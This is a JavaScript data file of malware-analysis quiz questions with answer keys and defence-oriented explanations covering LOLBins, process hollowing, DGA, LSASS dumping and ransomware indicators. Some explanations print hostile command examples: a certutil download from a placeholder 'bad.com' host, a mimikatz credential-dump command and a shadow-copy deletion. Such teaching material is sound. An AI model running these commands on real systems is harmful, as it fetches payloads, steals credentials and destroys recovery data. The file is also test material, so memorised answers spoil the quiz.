/**
 * Extended Malware Analysis Questions (mal51-100)
 * Lazy-loaded when user clicks "Load More Questions"
 *
 * Current Status: mal51-60 complete (10 questions)
 * Base questions (mal1-50) are in questions_data.js
 */

const malwareExtended = [
    {
        id: 'mal51',
        title: 'Living-off-the-Land Binaries',
        points: 13,
        question: 'Attacker uses PowerShell, wmic.exe, and certutil.exe to compromise system without dropping malware files. What is this technique?',
        type: 'radio',
        options: [
            { value: 'lolbas', text: 'Living-off-the-Land (LOLBins/LOLBas) - using legitimate tools' },
            { value: 'fileless', text: 'Fileless malware infection' },
            { value: 'apt', text: 'Advanced Persistent Threat' },
            { value: 'ransomware', text: 'Ransomware attack' },
            { value: 'rootkit', text: 'Rootkit installation' }
        ],
        correct: 'lolbas',
        explanation: 'üîß LOLBins (Living-off-the-Land Binaries): Abusing legitimate Windows/Linux tools for malicious purposes. Examples: **PowerShell** (download files, execute code), **certutil** (download payloads: certutil -urlcache -f http://bad.com/mal.exe), **wmic** (remote execution), **mshta** (run HTA/JS), **regsvr32** (Squiblydoo bypass), **bitsadmin** (download files). MITRE: T1218 (System Binary Proxy Execution). Defense: Application whitelisting, command-line logging, restrict PowerShell. Hard to detect = looks legitimate. Interview: "How do you detect LOLBin abuse?"'
    },
    {
        id: 'mal52',
        title: 'DLL Sideloading Attack',
        points: 12,
        question: 'Legitimate application loads malicious DLL from same directory instead of system DLL. What is this attack?',
        type: 'radio',
        options: [
            { value: 'sideload', text: 'DLL sideloading / search order hijacking' },
            { value: 'injection', text: 'DLL injection' },
            { value: 'preload', text: 'LD_PRELOAD attack' },
            { value: 'hijack', text: 'Process hijacking' },
            { value: 'replacement', text: 'DLL replacement' }
        ],
        correct: 'sideload',
        explanation: 'üì¶ DLL Sideloading: Windows searches for DLLs in specific order: 1) App directory, 2) System32, 3) PATH. Attacker places malicious version in app directory = loaded instead of legitimate DLL. Requires: Legitimate signed EXE (bypasses whitelisting), vulnerable to sideloading (doesn\'t use full path for LoadLibrary). Famous: APT groups use this heavily. MITRE: T1574.002. Defense: DLL load monitoring, application hardening (use full paths), code signing for all DLLs. Tools: SysInternals Process Monitor shows DLL search order. Interview: "Explain DLL search order vulnerabilities."'
    },
    {
        id: 'mal53',
        title: 'Cobalt Strike Beacon Detection',
        points: 14,
        question: 'Network analyst sees HTTP POST requests to /submit.php every 60 seconds with random-looking base64 data. What C2 framework is likely in use?',
        type: 'radio',
        options: [
            { value: 'cobaltstrike', text: 'Cobalt Strike - professional red team/threat actor tool' },
            { value: 'metasploit', text: 'Metasploit Framework' },
            { value: 'empire', text: 'PowerShell Empire' },
            { value: 'c2', text: 'Generic C2 malware' },
            { value: 'botnet', text: 'IRC botnet' }
        ],
        correct: 'cobaltstrike',
        explanation: 'üî¥ Cobalt Strike Beacon: Commercial penetration testing tool (also used by threat actors). Indicators: 1) **Beaconing**: Regular intervals (sleep time), 2) **HTTP POST**: Often /submit.php or /pixel, 3) **Base64/XOR encoding**: Encrypted C2 traffic, 4) **Malleable C2**: Customizable traffic patterns mimicking legitimate apps. Detection: Jitter analysis (timing patterns), JA3 SSL fingerprints, anomalous User-Agents. MITRE: Multiple TTPs. Defense: Network monitoring, YARA rules, endpoint detection. Cracked versions widely used by ransomware gangs. Interview: "Cobalt Strike indicators and detection."'
    },
    {
        id: 'mal54',
        title: 'Process Hollowing Technique',
        points: 13,
        question: 'Malware creates suspended legitimate process (e.g., svchost.exe), replaces memory with malicious code, resumes. What is this?',
        type: 'radio',
        options: [
            { value: 'hollow', text: 'Process hollowing / RunPE' },
            { value: 'injection', text: 'Simple DLL injection' },
            { value: 'hooking', text: 'API hooking' },
            { value: 'masquerade', text: 'Process masquerading' },
            { value: 'migration', text: 'Process migration' }
        ],
        correct: 'hollow',
        explanation: 'üëª Process Hollowing: 1) Create process in suspended state (CreateProcess with CREATE_SUSPENDED), 2) Unmap legitimate executable from memory (NtUnmapViewOfSection), 3) Allocate new memory and write malicious code, 4) Set entry point, 5) Resume thread. Result: Looks like svchost.exe in Process Explorer but running malicious code. MITRE: T1055.012. Detection: Memory analysis (volatility), EDR behavioral detection, parent-child process relationships. vs Injection: Replaces entire memory space (not just inject DLL). Interview: "Code injection techniques comparison."'
    },
    {
        id: 'mal55',
        title: 'Polymorphic vs Metamorphic Malware',
        points: 11,
        question: 'What is the difference between polymorphic and metamorphic malware?',
        type: 'radio',
        options: [
            { value: 'difference', text: 'Polymorphic changes encryption, metamorphic rewrites entire code structure' },
            { value: 'same', text: 'They are the same technique' },
            { value: 'speed', text: 'Polymorphic is faster' },
            { value: 'detection', text: 'Polymorphic is easier to detect' },
            { value: 'platform', text: 'Different operating systems' }
        ],
        correct: 'difference',
        explanation: 'ü¶† Evasion Techniques: **Polymorphic**: Same core malicious code, different encryption/obfuscation each time (decryptor stub changes). Signature-based AV fails. Example: Encrypted payload with variable XOR key. **Metamorphic**: Completely rewrites code structure while maintaining functionality. Uses: Instruction substitution, register swapping, dead code insertion, code permutation. Harder to detect (no decryption stub). Famous: Zmist, Simile viruses. Defense: Behavioral analysis, heuristics, sandboxing. Modern AV uses emulation to decrypt polymorphic malware. Interview: "Evolution of malware obfuscation."'
    },
    {
        id: 'mal56',
        title: 'Domain Generation Algorithm',
        points: 12,
        question: 'Malware generates 10,000 random domains daily, tries to connect to each. Only 1-2 are registered by attacker. What is the purpose?',
        type: 'radio',
        options: [
            { value: 'dga', text: 'Domain Generation Algorithm (DGA) - C2 resilience' },
            { value: 'dns_tunnel', text: 'DNS tunneling for data exfiltration' },
            { value: 'ddos', text: 'DNS DDoS attack' },
            { value: 'enumeration', text: 'Network enumeration' },
            { value: 'poisoning', text: 'DNS cache poisoning' }
        ],
        correct: 'dga',
        explanation: 'üé≤ DGA (Domain Generation Algorithm): Malware generates pseudo-random domains based on seed (date, constants). Attacker pre-computes same list, registers few domains = C2 servers. Benefits: 1) **Resilience**: Takedown blocks only current domains, 2) **Prediction difficulty**: Defenders can\'t preemptively sinkhole without algorithm, 3) **Distributed**: Thousands of potential domains. Famous: Conficker, Cryptolocker, Emotet. Detection: Anomalous DNS queries (high NXDOMAIN rate, dictionary entropy analysis), ML models. MITRE: T1568.002. Interview: "How do you detect and mitigate DGA?"'
    },
    {
        id: 'mal57',
        title: 'Reflective DLL Injection',
        points: 13,
        question: 'Malware loads DLL directly from memory without touching disk or using LoadLibrary API. What technique is this?',
        type: 'radio',
        options: [
            { value: 'reflective', text: 'Reflective DLL injection - manual PE loading' },
            { value: 'standard', text: 'Standard DLL injection' },
            { value: 'hollow', text: 'Process hollowing' },
            { value: 'hook', text: 'API hooking' },
            { value: 'sideload', text: 'DLL sideloading' }
        ],
        correct: 'reflective',
        explanation: 'üíâ Reflective DLL Injection: Load DLL directly into memory without calling LoadLibrary (evades DLL load hooks). Process: 1) Inject DLL bytes into target process, 2) DLL contains reflective loader stub, 3) Loader manually parses PE headers, 4) Resolves imports, 5) Calls DllMain. No file on disk, doesn\'t appear in loaded modules list (unless kernel callbacks enabled). Famous: Metasploit meterpreter, Cobalt Strike. MITRE: T1055.001. Detection: Memory scanning, unusual memory allocations (RWX), EDR kernel callbacks. Interview: "Injection techniques and detection."'
    },
    {
        id: 'mal58',
        title: 'WMI Persistence Mechanism',
        points: 12,
        question: 'Malware uses WMI Event Filter + Event Consumer to trigger on system boot without registry modifications. What is the advantage?',
        type: 'radio',
        options: [
            { value: 'stealth', text: 'Stealthy persistence - bypasses common autoruns checks' },
            { value: 'faster', text: 'Faster execution speed' },
            { value: 'cross_platform', text: 'Works on multiple platforms' },
            { value: 'encrypted', text: 'Automatically encrypts payload' },
            { value: 'none', text: 'No advantage - easily detected' }
        ],
        correct: 'stealth',
        explanation: 'üîÆ WMI Persistence: Windows Management Instrumentation permanent event subscriptions. Components: **Event Filter** (trigger condition: logon, time), **Event Consumer** (action: run command), **Filter-to-Consumer Binding**. Stored in WMI repository (not registry/startup folder). MITRE: T1546.003. Example: Filter triggers every 60min, Consumer runs PowerShell downloader. Detection: Get-WmiObject -Namespace root\\subscription, Autoruns shows WMI tab, Sysmon Event ID 19-21. Hard to detect without WMI-aware tools. APT29 (Cozy Bear) used this. Interview: "WMI attack techniques."'
    },
    {
        id: 'mal59',
        title: 'Credential Dumping with LSASS',
        points: 14,
        question: 'Attacker runs tool to extract plaintext passwords and NTLM hashes from memory. Which Windows process is targeted?',
        type: 'radio',
        options: [
            { value: 'lsass', text: 'lsass.exe - Local Security Authority Subsystem Service' },
            { value: 'svchost', text: 'svchost.exe' },
            { value: 'winlogon', text: 'winlogon.exe' },
            { value: 'csrss', text: 'csrss.exe' },
            { value: 'services', text: 'services.exe' }
        ],
        correct: 'lsass',
        explanation: 'üîê LSASS Credential Dumping: lsass.exe stores credentials in memory for SSO. Tools: **mimikatz** (sekurlsa::logonpasswords), **procdump** (create memory dump), **comsvcs.dll** (MiniDump). Extract: Plaintext passwords (WDigest enabled), NTLM hashes, Kerberos tickets. MITRE: T1003.001. Defense: Credential Guard (virtualized LSA), WDigest disabled (Win 10+), RunAsPPL (protected process), monitor lsass access (Sysmon Event ID 10). Accessing lsass = high-confidence IoC. Interview: "How do you protect against credential dumping?"'
    },
    {
        id: 'mal60',
        title: 'Ransomware Detection Indicators',
        points: 11,
        question: 'Which behaviors indicate ransomware encryption in progress? (Select ALL)',
        type: 'checkbox',
        options: [
            { value: 'file_changes', text: 'Mass file modifications/renames across network shares' },
            { value: 'extension', text: 'File extensions changing to .locked, .encrypted, etc.' },
            { value: 'vss_delete', text: 'Volume Shadow Copy deletion (vssadmin delete shadows)' },
            { value: 'high_cpu', text: 'High CPU usage from encryption operations' },
            { value: 'ransom_note', text: 'Ransom note files (README.txt, HOW_TO_DECRYPT.html)' },
            { value: 'slow_network', text: 'Slow network connection only' }
        ],
        correct: ['file_changes', 'extension', 'vss_delete', 'high_cpu', 'ransom_note'],
        explanation: 'üîí Ransomware IoCs: 1) **Mass file operations**: Thousands of files modified/renamed rapidly, 2) **Extension changes**: .docx‚Üí.docx.locky, 3) **VSS deletion**: vssadmin delete shadows /all /quiet (prevent recovery), 4) **Backup deletion**: Delete backups, 5) **Ransom notes**: Dropped in every folder, 6) **High entropy**: Encrypted files have high randomness, 7) **Network share enumeration**: net view, SMB scanning. MITRE: T1486. Detection: FSAudit, file honeypots (canary files), EDR behavioral rules. Defense: Offline backups, network segmentation, user training. Interview: "Ransomware kill chain and detection."'
    }
];

// Export for use in main application
if (typeof module !== 'undefined' && module.exports) {
    module.exports = malwareExtended;
}
